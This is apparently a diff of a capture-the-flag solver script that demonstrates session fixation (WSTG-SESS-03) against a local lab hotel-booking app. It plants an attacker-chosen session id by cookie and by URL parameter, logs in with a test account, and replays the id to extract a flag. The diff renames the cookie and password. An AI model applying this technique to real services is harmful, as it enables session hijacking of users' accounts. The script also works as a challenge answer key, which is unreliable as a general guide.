@@ -7,7 +7,7 @@ same identifier. If the app never rotates it on authentication, the pre-auth ide
 picked is now trusted -- that's the finding, not a puzzle to solve.
 
 Also demonstrates the secondary WSTG-SESS-03 checklist item: the session identifier is
-accepted just as readily via a `?resort_sid=` URL parameter as it is via the cookie.
+accepted just as readily via a `?guest_sid=` URL parameter as it is via the cookie.
 
 Usage: python3 solver.py [base_url]     (default http://localhost:8000)
 """
@@ -15,7 +15,7 @@ import sys, re, requests
 
 BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
 USER = "guest.stay"
-PASSWORD = "Coastline2024!"
+PASSWORD = "Meridian2024!"
 
 
 def main():
@@ -23,16 +23,16 @@ def main():
     planted_sid = "PWNED-BY-ZERO-4471"
     print(f"[*] planting our own session id BEFORE authenticating: {planted_sid!r}")
 
-    r = requests.get(f"{BASE}/masquerade/op2/", cookies={"resort_sid": planted_sid})
+    r = requests.get(f"{BASE}/masquerade/op2/", cookies={"guest_sid": planted_sid})
     print(f"[*] server's response to the pre-auth visit: HTTP {r.status_code}, "
-          f"resort_sid Set-Cookie present: {'resort_sid' in r.headers.get('set-cookie', '')}")
+          f"guest_sid Set-Cookie present: {'guest_sid' in r.headers.get('set-cookie', '')}")
 
     print(f"[*] logging in as the provided test account ({USER}), presenting the SAME sid")
-    requests.post(f"{BASE}/masquerade/op2/login", cookies={"resort_sid": planted_sid},
+    requests.post(f"{BASE}/masquerade/op2/login", cookies={"guest_sid": planted_sid},
                    data={"username": USER, "password": PASSWORD})
 
     print("[*] replaying our own planted sid -- never handed a server-issued one at all")
-    res = requests.get(f"{BASE}/masquerade/op2/reservations", cookies={"resort_sid": planted_sid})
+    res = requests.get(f"{BASE}/masquerade/op2/reservations", cookies={"guest_sid": planted_sid})
     flag = re.search(r"R6S\{[^}]*\}", res.text)
     if flag:
         print(f"[+] the planted key card is now authenticated: {flag.group(0)}")
@@ -42,7 +42,7 @@ def main():
     print("\n[*] Path 2 -- secondary finding: same trick, via URL parameter instead of a cookie")
     sid_via_url = "URL-PLANTED-9999"
     sess = requests.Session()
-    sess.get(f"{BASE}/masquerade/op2/?resort_sid={sid_via_url}")
+    sess.get(f"{BASE}/masquerade/op2/?guest_sid={sid_via_url}")
     sess.post(f"{BASE}/masquerade/op2/login", data={"username": USER, "password": PASSWORD})
     res2 = sess.get(f"{BASE}/masquerade/op2/reservations")
     flag2 = re.search(r"R6S\{[^}]*\}", res2.text)
